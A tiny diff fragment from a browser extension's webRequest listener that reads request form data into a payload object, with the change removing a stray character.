@@ -12,7 +12,7 @@ chrome.webRequest.onBeforeRequest.addListener(
         content = details.requestBody.formData
       }
     }
-    c
+
     let payload = {
       "date"    : new Date().toLocaleString(),
       "type"    : details.type,
